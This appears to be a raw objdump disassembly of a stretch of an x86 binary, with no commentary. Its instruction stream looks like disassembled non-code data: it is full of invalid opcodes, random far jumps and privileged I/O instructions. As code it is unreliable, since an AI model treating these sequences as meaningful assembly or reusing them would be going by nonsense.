  421e74:	lds    ebx,FWORD PTR [eax+edx*2]
  421e77:	add    al,0x88
  421e79:	sbb    BYTE PTR [edi],0xf6
  421e7c:	inc    ebx
  421e7d:	int    0xf4
  421e7f:	clc    
  421e80:	xor    cl,BYTE PTR [eax-0x297ceae1]
  421e86:	dec    ecx
  421e87:	inc    esp
  421e88:	shl    BYTE PTR [edx+0xc],cl
  421e8b:	in     eax,0x8b
  421e8d:	(bad)  
  421e8e:	fimul  WORD PTR [ecx+0x1e]
  421e91:	data16 loop 0x421e74
  421e94:	cdq    
  421e95:	mov    al,ds:0x9bcd5e57
  421e9a:	dec    esi
  421e9b:	ins    DWORD PTR es:[edi],dx
  421e9c:	jnp    0x421eff
  421e9e:	sti    
  421e9f:	jp     0x421ee5
  421ea1:	cmp    DWORD PTR [ecx+0x23],edi
  421ea4:	sub    ch,ah
  421ea6:	xchg   BYTE PTR [esi-0x6bbc793f],bl
  421eac:	push   ebp
  421ead:	and    cl,dl
  421eaf:	clc    
  421eb0:	popf   
  421eb1:	es xchg ebp,eax
  421eb3:	cmc    
  421eb4:	push   0xffffffc1
  421eb6:	dec    ebp
  421eb7:	dec    dh
  421eb9:	sar    DWORD PTR [ecx-0x56393a61],cl
  421ebf:	sub    ebx,edi
  421ec1:	sti    
  421ec2:	xchg   esi,eax
  421ec3:	stc    
  421ec4:	pusha  
  421ec5:	push   ebx
  421ec6:	xchg   esp,eax
  421ec7:	pushf  
  421ec8:	test   al,0xf8
  421eca:	out    dx,al
  421ecb:	jmp    0x2ed6:0xce1c861e
  421ed2:	aas    
  421ed3:	cmp    eax,0x5782a3c1
  421ed8:	sbb    edi,0x49
  421edb:	jne    0x421f27
  421edd:	mov    ds:0xed772520,eax
  421ee2:	mov    ebp,0x6140d070
  421ee7:	xlat   BYTE PTR ds:[ebx]
  421ee8:	inc    ecx
  421ee9:	cs pop ecx
  421eeb:	pop    eax
  421eec:	xor    al,bl
  421eee:	pop    ebx
  421eef:	cld    
  421ef0:	xchg   BYTE PTR [ebp+ecx*1+0x48d7934],cl
  421ef7:	scas   al,BYTE PTR es:[edi]
  421ef8:	or     BYTE PTR [ebx-0x32cd2334],dl
  421efe:	xchg   esp,eax
  421eff:	jl     0x421ea6
  421f01:	cwde   
  421f02:	push   ecx
  421f03:	sbb    BYTE PTR [ebx-0x54],0x62
  421f07:	push   edi
  421f08:	pop    eax
  421f09:	pop    edx
  421f0a:	sbb    BYTE PTR [ecx+eax*8-0x46],al
  421f0e:	out    0xf1,eax
  421f10:	ret    0x76f4
  421f13:	repz inc edi
  421f15:	jae    0x421eb3
  421f17:	ss addr16 push ds
  421f1a:	sbb    eax,0xdd51c352
  421f1f:	(bad)  
  421f20:	out    dx,eax
  421f21:	dec    edi
  421f22:	rcl    DWORD PTR [edx],cl
  421f24:	je     0x421eb0
  421f26:	retf   
  421f27:	rcl    BYTE PTR [ecx+0x5076ec10],1
  421f2d:	push   ds
  421f2e:	push   es
  421f2f:	popa   
  421f30:	mov    WORD PTR [ebp-0x69],ds
  421f33:	pushf  
  421f34:	fprem  
  421f36:	daa    
  421f37:	int3   
  421f38:	jne    0x421fa3
  421f3a:	stc    
  421f3b:	add    ebp,DWORD PTR [ecx]
  421f3d:	or     dh,bh
  421f3f:	loopne 0x421f56
  421f41:	dec    ebx
  421f42:	cs pop ecx
  421f44:	inc    edi
  421f45:	sahf   
  421f46:	jle    0x421f59
  421f48:	rcl    DWORD PTR [edx-0x33],0xb9
  421f4c:	and    edi,DWORD PTR [edx+0x62]
  421f4f:	add    al,0x4d
  421f51:	sbb    eax,0x3e92c253
  421f56:	sub    bl,BYTE PTR [ebp+0x58afe264]
  421f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f5d:	and    eax,0xf87b4de4
  421f62:	and    BYTE PTR [edi+0x39],0x98
  421f66:	push   esp
  421f67:	call   0x73a4:0xec21b97e
  421f6e:	or     dh,BYTE PTR [edi+ebp*8-0x5fd89b67]
  421f75:	mov    esp,0xfcafe351
  421f7a:	test   ecx,ecx
  421f7c:	jns    0x421f11
  421f7e:	add    DWORD PTR [ebx],esi
  421f80:	std    
  421f81:	sbb    edx,DWORD PTR ds:0x6904da65
  421f87:	(bad)  
  421f88:	adc    BYTE PTR [ecx-0x5f854f1b],al
  421f8e:	pop    ecx
  421f8f:	push   ss
  421f90:	mov    al,0xad
  421f92:	pop    ds
  421f93:	and    eax,0xc929bb6a
  421f98:	mov    esi,0x7f0af68f
  421f9d:	pop    ebx
  421f9e:	call   0x7ba6:0x962a1904
  421fa5:	add    DWORD PTR [ecx],ebx
  421fa7:	fmul   QWORD PTR [esi+0x3ce0ffce]
  421fad:	pop    esp
  421fae:	sbb    eax,0x14db9f8d
  421fb3:	add    ebp,DWORD PTR [eax]
  421fb5:	jmp    0xb058:0x9144ecbb
  421fbc:	test   al,0xd2
  421fbe:	and    al,0xcf
  421fc0:	inc    ecx
  421fc1:	aaa    
  421fc2:	cmp    edi,esp
  421fc4:	push   cs
  421fc5:	cwde   
  421fc6:	imul   ebp,DWORD PTR [edx],0xe0e9f388
  421fcc:	popa   
  421fcd:	inc    esp
  421fce:	fstp   QWORD PTR [eax-0x69]
  421fd1:	test   DWORD PTR [ecx-0x63],ebp
  421fd4:	scas   eax,DWORD PTR es:[edi]
  421fd5:	jmp    0x421f86
  421fd7:	retf   0x5074
  421fda:	xor    al,BYTE PTR [ebx-0x7f]
  421fdd:	repz jbe 0x422007
  421fe0:	sbb    DWORD PTR [ebx],0xfffffffb
  421fe3:	pop    es
  421fe4:	push   esp
  421fe5:	(bad)  
  421fe7:	pop    eax
  421fe8:	ficom  DWORD PTR [eax+ecx*8]
  421feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fec:	pop    ss
  421fed:	les    edx,FWORD PTR [ebp-0x14dc856a]
  421ff3:	sbb    bh,BYTE PTR [ebx+0x61]
  421ff6:	push   eax
  421ff7:	adc    DWORD PTR [ecx+0x3f],edx
  421ffa:	retf   0x9a86
  421ffd:	lea    edx,ds:0x299af246
  422003:	add    eax,0xa28b433
  422008:	into   
  422009:	(bad)  
  42200a:	retf   
  42200b:	mov    dh,ch
  42200d:	das    
  42200e:	xchg   edx,eax
  42200f:	fld    st(7)
  422011:	and    bh,BYTE PTR [ecx]
  422013:	sar    edx,cl
  422015:	es loope 0x422030
  422018:	pop    es
  422019:	xor    bh,BYTE PTR [eax-0x39851d41]
  42201f:	mov    ebx,0x4cd73cd1
  422024:	jbe    0x422026
  422026:	push   edi
  422027:	mov    eax,0xa6bbc4d4
  42202c:	jno    0x422085
  42202e:	pop    edx
  42202f:	(bad)  
  422031:	cmc    
  422032:	mov    ch,0x2b
  422034:	adc    cl,dl
  422036:	not    DWORD PTR [ecx+0xf]
  422039:	ret    
  42203a:	pop    ecx
  42203b:	gs mov eax,0xfe824aaa
  422041:	add    ebp,DWORD PTR [ebx-0x6f9a303]
  422047:	hlt    
  422048:	mov    ecx,0xbd647fb1
  42204d:	xlat   BYTE PTR ds:[ebx]
  42204e:	mov    ah,0xc3
  422050:	mov    edx,0xd68f88a4
  422055:	(bad)  
  422056:	fdiv   DWORD PTR [ecx+edi*4-0x66aa8090]
  42205d:	dec    ebp
  42205e:	or     bl,BYTE PTR [ebx]
  422060:	add    esp,DWORD PTR [edx]
  422062:	inc    edi
  422063:	adc    al,0x56
  422065:	fcom   DWORD PTR [ecx-0x44]
  422068:	adc    ebp,ebx
  42206a:	add    BYTE PTR [ecx+0x70],dl
  42206d:	shr    DWORD PTR [ecx],cl
  42206f:	aam    0x66
  422071:	pop    edi
  422072:	cmp    eax,0x74322687
  422077:	jle    0x422068
  422079:	adc    ebp,esp
  42207b:	mov    al,0x5c
  42207e:	add    al,0x22
  422080:	fdivr  DWORD PTR [esi-0x40]
  422083:	xor    eax,0xdf77c4ce
  422088:	cmp    al,0xb0
  42208a:	inc    ebx
  42208b:	dec    edx
  42208c:	fstp   QWORD PTR [ecx-0x3e]
  42208f:	or     eax,DWORD PTR [ebx+0x5]
  422092:	dec    ebp
  422093:	int3   
  422094:	repz add bh,0x7d
  422098:	mov    BYTE PTR [ebx+0x2dda04c4],cl
  42209e:	mov    ah,0x70
  4220a0:	and    al,0xeb
  4220a2:	dec    esp
  4220a3:	scas   eax,DWORD PTR es:[edi]
  4220a4:	iret   
  4220a5:	xor    DWORD PTR [edx],esi
  4220a7:	xor    ecx,DWORD PTR [eax+ebp*4+0x62827909]
  4220ae:	xlat   BYTE PTR ds:[ebx]
  4220af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220b0:	sub    eax,0x36dbf4b8
  4220b5:	imul   ebp,DWORD PTR [eax-0x3a],0x172258ca
  4220bc:	dec    ebx
  4220bd:	jmp    0x55d2d27b
  4220c2:	(bad)  
  4220c3:	cmp    cl,cl
  4220c5:	xchg   edi,eax
  4220c6:	sbb    ebp,DWORD PTR [eax+ebx*2+0x26bfdf15]
  4220cd:	adc    cl,BYTE PTR [edi+0x6f468bab]
  4220d3:	and    ecx,DWORD PTR [ebp+0x4db1b1e4]
  4220d9:	jmp    0x422107
  4220db:	mov    esi,0xde6fc430
  4220e0:	(bad)  
  4220e1:	in     eax,dx
  4220e2:	int    0xad
  4220e4:	mov    ch,0x69
  4220e6:	ret    
  4220e7:	enter  0x4415,0x20
  4220eb:	fmul   DWORD PTR [edx]
  4220ed:	adc    al,0xbb
  4220ef:	push   0x5b
  4220f1:	fimul  WORD PTR [edx]
  4220f3:	sub    eax,0x61e562a2
  4220f8:	fist   DWORD PTR [ecx]
  4220fa:	dec    edx
  4220fb:	ja     0x422119
  4220fd:	sbb    bl,dh
  4220ff:	mov    ah,0x59
  422101:	and    BYTE PTR [edx-0x37],cl
  422104:	mov    dl,BYTE PTR [eax-0x42]
  422107:	inc    eax
  422108:	adc    BYTE PTR [edi+0x183546bd],cl
  42210e:	xor    ax,0x1fc8
  422112:	ret    0x1c49
  422115:	fstp   TBYTE PTR [ecx]
  422117:	inc    esi
  422118:	push   edi
  422119:	xchg   edx,eax
  42211a:	xchg   edi,eax
  42211b:	adc    BYTE PTR [ebx+0x75],ch
  42211e:	mov    edi,0x248313c7
  422123:	test   al,0xee
  422125:	jmp    0xd399:0x84455c0f
  42212c:	push   0xffffffdc
  42212e:	add    al,0xd8
  422130:	sti    
  422131:	pop    eax
  422132:	push   ecx
  422133:	inc    edi
  422134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422135:	neg    BYTE PTR [ebx-0x23282721]
  42213b:	cli    
  42213c:	pop    es
  42213d:	fist   DWORD PTR [edi+0x9]
  422140:	push   edx
  422141:	and    esp,DWORD PTR [ebx-0x2d9015]
  422147:	dec    edi
  422148:	scas   al,BYTE PTR es:[edi]
  422149:	int3   
  42214a:	(bad)  
  42214b:	jl     0x422117
  42214d:	ja     0x4221bf
  42214f:	xchg   esi,eax
  422150:	clc    
  422151:	imul   ecx,ebx,0x34
  422154:	test   ecx,eax
  422156:	inc    edx
  422157:	sub    eax,DWORD PTR [ebp-0x549abcaa]
  42215d:	into   
  42215e:	push   esi
  42215f:	rcl    BYTE PTR [esi+0x48],cl
  422162:	mov    dl,0x72
  422164:	or     al,0x7d
  422166:	or     DWORD PTR [edi+0x2],edx
  422169:	pushf  
  42216a:	cld    
  42216b:	jge    0x4221e8
  42216d:	sub    edx,DWORD PTR [edi+edx*1+0x568e620f]
  422174:	(bad)  
  422175:	pushf  
  422176:	shl    DWORD PTR [ebp-0x4d],1
  422179:	jmp    DWORD PTR [edx+0x21]
  42217c:	sahf   
  42217d:	push   ebp
  42217e:	enter  0xa5b5,0x86
  422182:	mov    edi,0x70a7a28a
  422187:	sahf   
  422188:	sub    eax,0x6cd08c7
  42218d:	pop    edi
  42218e:	jb     0x42214f
  422190:	or     BYTE PTR ds:0x5ffb67b1,0x36
  422197:	dec    ebp
  422198:	xchg   esp,eax
  422199:	jmp    0x4221bf
  42219b:	or     eax,0x4799bb9a
  4221a0:	bound  ebp,QWORD PTR [esi+0x2c]
  4221a3:	mov    al,0xd
  4221a5:	fnsave [ebx-0x7033a80d]
  4221ab:	lods   eax,DWORD PTR ds:[esi]
  4221ac:	adc    DWORD PTR [edi-0x7f29f1be],esi
  4221b2:	das    
  4221b3:	and    ebp,DWORD PTR [edi+edi*1]
  4221b6:	daa    
  4221b7:	pop    ecx
  4221b8:	sub    bl,BYTE PTR [eax]
  4221ba:	or     eax,0xea93bac6
  4221bf:	sub    dh,BYTE PTR [ebx+0xc5263f0]
  4221c5:	mov    esi,0x5b0259f6
  4221ca:	add    esp,DWORD PTR [edi]
  4221cc:	adc    DWORD PTR [eax-0x7e],ebp
  4221cf:	fdivr  QWORD PTR ss:[ecx-0x36]
  4221d3:	mov    edx,0xa016b45c
  4221d8:	jecxz  0x4221a5
  4221da:	pop    eax
  4221db:	daa    
  4221dc:	xor    BYTE PTR [ecx+0x45a61137],ch
  4221e2:	(bad)  
  4221e3:	jp     0x422171
  4221e5:	xlat   BYTE PTR ds:[ebx]
  4221e6:	xchg   ebx,eax
  4221e7:	fwait
  4221e8:	scas   eax,DWORD PTR es:[edi]
  4221e9:	out    0x41,eax
  4221eb:	xor    al,0x8a
  4221ed:	neg    ch
  4221ef:	or     cl,bh
  4221f1:	sub    eax,0x18f34ae4
  4221f6:	mov    ah,0x3f
  4221f8:	daa    
  4221f9:	shl    BYTE PTR [ecx+0x640fb0e5],0x45
  422200:	inc    eax
  422201:	xor    BYTE PTR [esi+0x3eda5a85],0xe8
  422208:	ffree  st(7)
  42220a:	jge    0xbc6801a5
  422210:	or     esi,DWORD PTR [esi-0x18]
  422213:	mov    ah,0x6d
  422215:	aad    0x18
  422217:	adc    al,0xfd
  422219:	xlat   BYTE PTR ds:[ebx]
  42221a:	xor    ah,0x36
  42221d:	xchg   esi,eax
  42221e:	inc    ecx
  42221f:	mov    ecx,0xe0fe1a30
  422224:	add    edi,eax
  422226:	scas   al,BYTE PTR es:[edi]
  422227:	jge    0x4221f4
  422229:	xchg   BYTE PTR [eax-0x40],dh
  42222c:	push   cs
  42222d:	test   BYTE PTR [esi+0xfa05990],dl
  422233:	(bad)  
  422234:	mov    ?,esi
  422236:	not    DWORD PTR [edi]
  422238:	int    0x3e
  42223a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42223b:	sbb    BYTE PTR [esi],ch
  42223d:	(bad)  
  42223e:	hlt    
  42223f:	mov    ds:0x1b0a961a,eax
  422244:	and    esp,edx
  422246:	dec    ecx
  422247:	xchg   BYTE PTR [ecx-0x6b9fd70],dh
  42224d:	std    
  42224e:	neg    DWORD PTR [edi+0x1e25074]
  422254:	jae    0x42221a
  422256:	aad    0x98
  422258:	hlt    
  422259:	mov    cl,BYTE PTR [eax+0x8]
  42225c:	mov    ebp,0x4bcd156a
  422261:	mov    BYTE PTR [eax+0x63],dh
  422264:	aad    0x83
  422266:	push   ss
  422267:	adc    DWORD PTR [edx-0x7c2ec39c],ebx
  42226d:	add    BYTE PTR [edx+eax*8+0x7],dl
  422271:	mov    eax,0x13826405
  422276:	jbe    0x422259
  422278:	cld    
  422279:	pop    es
  42227a:	out    dx,eax
  42227b:	push   ds
  42227c:	push   edi
  42227d:	jno    0x4222a5
  42227f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422280:	xchg   ebx,eax
  422281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422282:	xor    bh,bl
  422284:	cmp    eax,0xfc009b0f
  422289:	arpl   dx,dx
  42228b:	test   BYTE PTR [ebx-0x17ce7718],ch
  422291:	mov    ch,ch
  422293:	cmc    
  422294:	fisubr DWORD PTR [esi]
  422296:	das    
  422297:	push   edi
  422298:	jae    0x422312
  42229a:	jp     0x422222
  42229c:	jbe    0x4222af
  42229e:	mov    bp,0x2289
  4222a2:	xor    dl,BYTE PTR [edx-0x731f68d4]
  4222a8:	dec    ebx
  4222a9:	mov    eax,ds:0xedf8eb3f
  4222ae:	jae    0x422328
  4222b0:	add    BYTE PTR [edi],0xf5
  4222b3:	push   ss
  4222b4:	xchg   esp,eax
  4222b5:	out    dx,al
  4222b6:	mov    es,WORD PTR [ebp+0x63965e14]
  4222bc:	mov    ebx,0xe8d5cc93
  4222c1:	into   
  4222c2:	and    eax,0x496b0
  4222c7:	hlt    
  4222c8:	xor    ebp,DWORD PTR [eax-0x2e]
  4222cb:	data16 (bad) 
  4222cd:	out    0x3f,al
  4222cf:	loope  0x422303
  4222d1:	cmp    eax,0xbeaef0d6
  4222d6:	mov    edi,DWORD PTR [ebx]
  4222d8:	outs   dx,DWORD PTR cs:[esi]
  4222da:	mov    ds,WORD PTR [eax]
  4222dc:	(bad)  
  4222dd:	(bad)  [eax]
  4222df:	xchg   dl,ch
  4222e1:	aaa    
  4222e2:	int3   
  4222e3:	mov    BYTE PTR [ebp+0x52d83658],bh
  4222e9:	mov    dl,0x57
  4222eb:	xchg   DWORD PTR [edx-0xba319d6],esp
  4222f1:	fwait
  4222f2:	das    
  4222f3:	pusha  
  4222f4:	out    dx,al
  4222f5:	mov    edx,0x3a1e8377
  4222fa:	push   0x2358c0
  4222ff:	mov    dh,0xf8
  422301:	out    0x9f,eax
  422303:	outs   dx,DWORD PTR ds:[esi]
  422304:	(bad)  
  422305:	sbb    al,0x24
  422307:	in     al,0xd4
  422309:	cs out 0x6d,eax
  42230c:	out    dx,eax
  42230d:	cmp    al,0x71
  42230f:	inc    ebx
  422310:	xor    eax,edx
  422312:	retf   0xa423
  422315:	add    BYTE PTR [ebx+0x55f6ca60],al
  42231b:	aad    0x9c
  42231d:	(bad)  
  42231e:	imul   edx,DWORD PTR [esi-0x48c4a989],0x3e3169b5
  422328:	imul   ecx,DWORD PTR [ecx+0x29338f55],0x3d62f7a7
  422332:	pop    ss
  422333:	arpl   WORD PTR cs:[edx-0x34130818],di
  42233a:	inc    esp
  42233b:	(bad)  
  42233c:	cmp    al,0xeb
  42233e:	loopne 0x422364
  422340:	dec    edx
  422341:	cli    
  422342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422343:	mov    bh,0xef
  422345:	jl     0x4222d8
  422347:	fsub   st(2),st
  422349:	inc    esi
  42234a:	aaa    
  42234b:	sub    ebp,DWORD PTR [esi]
  42234d:	push   ebp
  42234e:	and    al,0x74
  422350:	jmp    0xab03:0xe5d0d4ee
  422357:	xor    eax,DWORD PTR [ecx]
  422359:	imul   edx,DWORD PTR [edx-0x5936f8d],0xd5ee1477
  422363:	push   esi
  422364:	hlt    
  422365:	lods   eax,DWORD PTR es:[esi]
  422367:	test   BYTE PTR [edx-0x58],dl
  42236a:	xor    DWORD PTR [eax],0xffffff93
  42236d:	pop    ecx
  42236e:	cwde   
  42236f:	jb     0x42234e
  422371:	cmp    al,0x3
  422373:	scas   al,BYTE PTR es:[edi]
  422374:	mov    WORD PTR [esi-0x31a93d40],ss
  42237a:	cmc    
  42237b:	test   DWORD PTR [eax-0x4a828c15],edx
  422381:	fiadd  WORD PTR [esi-0x63]
  422384:	xor    al,0xd7
  422386:	mov    fs,WORD PTR [eax+0x12db137]
  42238c:	stc    
  42238d:	imul   ebx,DWORD PTR [edi],0xe6017400
  422393:	pop    ecx
  422394:	and    BYTE PTR [ecx-0x73f053a3],ah
  42239a:	ins    BYTE PTR es:[edi],dx
  42239b:	lahf   
  42239c:	xor    eax,0x6390caf9
  4223a1:	add    eax,esi
  4223a3:	cmp    dl,BYTE PTR [edx+0x76fbf51e]
  4223a9:	rcl    BYTE PTR [ecx+ecx*1],0x89
  4223ad:	into   
  4223ae:	(bad)  
  4223af:	push   ecx
  4223b0:	pop    ebx
  4223b1:	cmp    BYTE PTR [ecx+0x14],bl
  4223b4:	push   0x52
  4223b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223b7:	(bad)  [ebp-0x40]
  4223ba:	cmp    al,BYTE PTR es:[eax+0x61]
  4223be:	int3   
  4223bf:	or     ecx,ebp
  4223c1:	jne    0x422349
  4223c3:	icebp  
  4223c4:	pop    ss
  4223c5:	mov    bh,dh
  4223c7:	sub    BYTE PTR [edx-0x5b],bl
  4223ca:	or     BYTE PTR [ecx],0xbb
  4223cd:	jp     0x42235a
  4223cf:	and    al,0xf9
  4223d1:	push   esp
  4223d2:	or     edi,ebp
  4223d4:	out    dx,eax
  4223d5:	sub    bl,BYTE PTR [edx-0x71]
  4223d8:	and    cl,0x7a
  4223db:	in     al,0x82
  4223dd:	(bad)  
  4223df:	ds jp  0x422423
  4223e2:	into   
  4223e3:	ins    DWORD PTR es:[edi],dx
  4223e4:	jl     0x4223ac
  4223e6:	jbe    0x422413
  4223e8:	(bad)  
  4223ea:	sbb    DWORD PTR [ecx+0x2ad08822],0xffffffbf
  4223f1:	mov    al,0xa6
  4223f3:	aas    
  4223f4:	leave  
  4223f5:	imul   ebx,DWORD PTR [eax],0xc04f87e7
  4223fb:	call   0x7a57:0xa16bbc33
  422402:	mov    esp,0x7157f009
  422407:	dec    edx
  422408:	inc    ecx
  422409:	lods   eax,DWORD PTR ds:[esi]
  42240a:	pop    ebx
  42240b:	js     0x4223a0
  42240d:	inc    BYTE PTR [ecx]
  42240f:	cmp    BYTE PTR [esi+0x69],al
  422412:	shl    esp,0xea
  422415:	rcl    DWORD PTR [esi-0x411875b8],0x83
  42241c:	push   ebx
  42241d:	and    DWORD PTR [ecx+0x729fe25b],esi
  422423:	inc    esp
  422424:	cwde   
  422425:	in     eax,dx
  422426:	sub    DWORD PTR [esi+0x10bc42c3],ebp
  42242c:	cs fs imul bh
  422430:	push   DWORD PTR [edx-0x44]
  422433:	mov    eax,DWORD PTR ds:0xe2acf67e
  422439:	stos   BYTE PTR es:[edi],al
  42243a:	mov    dl,bh
  42243c:	fnsave [esi+0x4c]
  42243f:	mov    dh,0xe1
  422441:	outs   dx,DWORD PTR ds:[esi]
  422442:	inc    esp
  422443:	(bad)  
  422444:	mov    esp,0x36b901db
  422449:	lea    esi,[eax+0x54]
  42244c:	ins    BYTE PTR es:[edi],dx
  42244d:	jbe    0x422470
  42244f:	repnz push eax
  422451:	jno    0x422485
  422453:	inc    ebx
  422454:	and    BYTE PTR [eax],cl
  422456:	fsubp  st(0),st
  422458:	jmp    0xd50bb63e
  42245d:	int    0xfc
  42245f:	lea    ebx,[eax+0x64]
  422462:	inc    ecx
  422463:	shl    BYTE PTR [edx+0x410ca],cl
  422469:	call   0x97c7:0x4c406fb1
  422470:	inc    edi
  422471:	cmp    al,0x46
  422473:	mov    ebx,DWORD PTR [edi+ecx*2]
  422476:	add    eax,0x7aad9590
  42247b:	mov    dl,BYTE PTR [ebp+eiz*1+0x25]
  42247f:	dec    esi
  422480:	inc    edi
  422481:	mov    DWORD PTR [ecx+0x51],ebx
  422484:	pop    ss
  422485:	push   0x27
  422487:	mov    cs,edx
  422489:	mov    DWORD PTR [edx+0x1a],0x41c7e3e9
  422490:	addr16 xchg ebp,eax
  422492:	inc    ecx
  422493:	test   ebp,edi
  422495:	jecxz  0x422434
  422497:	(bad)  
  422498:	(bad)  [edi]
  42249a:	lock outs dx,DWORD PTR ds:[esi]
  42249c:	inc    esp
  42249d:	inc    ebx
  42249e:	ins    DWORD PTR es:[edi],dx
  42249f:	or     al,0x96
  4224a1:	pusha  
  4224a2:	(bad)  
  4224a3:	ror    cl,1
  4224a5:	lea    esi,[edi]
  4224a7:	(bad)  
  4224a8:	cmp    BYTE PTR [eax+0x4f50a544],bl
  4224ae:	and    al,0xa8
  4224b0:	inc    esp
  4224b1:	pop    es
  4224b2:	ins    BYTE PTR es:[edi],dx
  4224b3:	or     eax,0xae6a322d
  4224b8:	jge    0x422466
  4224ba:	inc    edi
  4224bb:	jb     0x42248c
  4224bd:	fcmovnbe st,st(7)
  4224bf:	shl    DWORD PTR [ecx+eiz*1-0x626f89dc],1
  4224c6:	fbld   TBYTE PTR [ecx+0xf69e87d]
  4224cc:	mov    dl,0xcb
  4224ce:	dec    ebx
  4224cf:	jg     0x422512
  4224d1:	mov    bh,BYTE PTR [esi+0x2a3f659a]
  4224d7:	jno    0x422493
  4224d9:	in     al,dx
  4224da:	aaa    
  4224db:	ds out 0xe6,al
  4224de:	out    0xa6,al
  4224e0:	into   
  4224e1:	call   0x2347:0x6410c3e6
  4224e8:	call   DWORD PTR [edx-0x39]
  4224eb:	or     BYTE PTR [edi],al
  4224ed:	dec    ebp
  4224ee:	imul   eax,DWORD PTR [ecx+0x72],0xdf137968
  4224f5:	push   0x5b5ad120
  4224fa:	daa    
  4224fb:	adc    esi,eax
  4224fd:	stos   DWORD PTR es:[edi],eax
  4224fe:	cdq    
  4224ff:	add    al,0x50
  422501:	xchg   edi,eax
  422502:	ret    0xe733
  422505:	xchg   ebp,eax
  422506:	adc    ebx,ecx
  422508:	inc    esp
  422509:	pop    ds
  42250a:	stos   DWORD PTR es:[edi],eax
  42250b:	jecxz  0x42252a
  42250d:	jmp    0x422568
  42250f:	mov    esp,0x6a7c8dcc
  422514:	sbb    eax,0x3fc8d4ef
  422519:	cs jl  0x4224c1
  42251c:	and    DWORD PTR [edi-0xc55037c],0x11ffa48f
  422526:	lahf   
  422527:	loope  0x422593
  422529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42252a:	retf   
  42252b:	enter  0xf0cd,0x8a
  42252f:	adc    DWORD PTR [ecx],eax
  422531:	adc    ebp,DWORD PTR [ebx]
  422533:	pop    edx
  422534:	rol    BYTE PTR [edi],0xba
  422537:	mov    dl,0xa1
  422539:	not    DWORD PTR [ebp+esi*2+0x41]
  42253d:	pop    esp
  42253e:	cmc    
  42253f:	sub    al,0xa9
  422541:	shl    BYTE PTR [eax+0x55],0x40
  422545:	cs stc 
  422547:	jb     0x422529
  422549:	ins    BYTE PTR es:[edi],dx
  42254a:	mov    ds:0xccb3c1ac,eax
  42254f:	dec    ecx
  422550:	ret    
  422551:	mov    cl,0x4c
  422553:	xchg   esi,eax
  422554:	scas   eax,DWORD PTR es:[edi]
  422555:	pop    ds
  422556:	sbb    eax,0xbc1175aa
  42255b:	jecxz  0x422569
  42255d:	or     BYTE PTR [esi+ebp*1],dl
  422560:	jns    0x42258d
  422562:	mov    esi,0x986883ea
  422567:	popa   
  422568:	xchg   edx,eax
  422569:	mov    ecx,0x10b5a99e
  42256e:	out    0x3d,eax
  422570:	mov    esp,edx
  422572:	fst    DWORD PTR [ebp-0x33]
  422575:	xor    DWORD PTR [eax],eax
  422577:	cmp    esp,0xffffffc1
  42257a:	xchg   esi,eax
  42257b:	mov    ebp,0xeeab9a72
  422580:	mov    ah,0x92
  422582:	pop    ebx
  422583:	jmp    0xa0c2:0x29aa2343
  42258a:	(bad)  
  42258b:	xor    al,0xd8
  42258d:	mov    BYTE PTR [eax-0x74],ah
  422590:	loop   0x422586
  422592:	jo     0x422518
  422594:	leave  
  422595:	mov    esi,0xb88e1483
  42259a:	push   ecx
  42259b:	pop    eax
  42259c:	xchg   ebp,eax
  42259d:	and    DWORD PTR [ecx-0x23b65c5a],ebp
  4225a3:	mov    esp,0x4869f636
  4225a8:	and    BYTE PTR [ebp+0x6f],dl
  4225ab:	stos   BYTE PTR es:[edi],al
  4225ac:	and    eax,0x824bffa4
  4225b1:	ror    cl,0x9d
  4225b4:	cmp    al,0x77
  4225b6:	and    eax,0xd8c27808
  4225bb:	(bad)  
  4225bc:	cmp    eax,0x326ea423
  4225c1:	shl    edx,cl
  4225c3:	fnstcw WORD PTR ds:[ecx]
  4225c6:	pop    edx
  4225c7:	add    eax,ecx
  4225c9:	popf   
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	mov    DWORD PTR [eax+0xe7e17b1],esp
  4225d1:	pop    es
  4225d2:	popf   
  4225d3:	jle    0x42263f
  4225d5:	fmul   QWORD PTR [ebx+eiz*4]
  4225d8:	sub    eax,DWORD PTR [ecx]
  4225da:	repz pop ebx
  4225dc:	pop    esi
  4225dd:	sbb    DWORD PTR [ebx],ebx
  4225df:	or     DWORD PTR [eax+0x7a428996],ebp
  4225e5:	loope  0x42265a
  4225e7:	jl     0x4225a6
  4225e9:	jmp    0xb889:0x254feac7
  4225f0:	loopne 0x4225ed
  4225f2:	push   ebp
  4225f3:	sub    DWORD PTR [edi+0x111aab8a],ebp
  4225f9:	ins    DWORD PTR es:[edi],dx
  4225fa:	(bad)  
  4225fb:	das    
  4225fc:	push   edi
  4225fd:	add    al,0xbe
  4225ff:	adc    eax,0x12d303c4
  422604:	push   cs
  422605:	sbb    ebx,DWORD PTR [ebx-0x59]
  422608:	(bad)  
  422609:	or     esp,ecx
  42260b:	jmp    0x3bfbe528
  422610:	sahf   
  422611:	sub    ebx,DWORD PTR [edi]
  422613:	dec    esp
  422614:	outs   dx,DWORD PTR ds:[esi]
  422615:	jno    0x42262e
  422617:	fistp  QWORD PTR [eax]
  422619:	ret    
  42261a:	mov    esi,0xe08513c0
  42261f:	popa   
  422620:	dec    edx
  422621:	in     al,0x8f
  422623:	push   ss
  422624:	mov    ds:0x49270777,eax
  422629:	shr    DWORD PTR [edi+eiz*4+0x54],0xec
  42262e:	sub    ecx,0xffffffe6
  422631:	stos   DWORD PTR es:[edi],eax
  422632:	inc    eax
  422633:	push   ecx
  422634:	sub    eax,0x80855e50
  422639:	cwde   
  42263a:	aas    
  42263b:	outs   dx,DWORD PTR ds:[esi]
  42263c:	mov    dh,0xc0
  42263e:	hlt    
  42263f:	ss aaa 
  422641:	mov    bl,0xc7
  422643:	push   ebp
  422644:	or     al,0x5e
  422646:	and    BYTE PTR [edx+0x290b4a16],bl
  42264c:	push   cs
  42264d:	lock push es
  42264f:	(bad)  [eax+0x28]
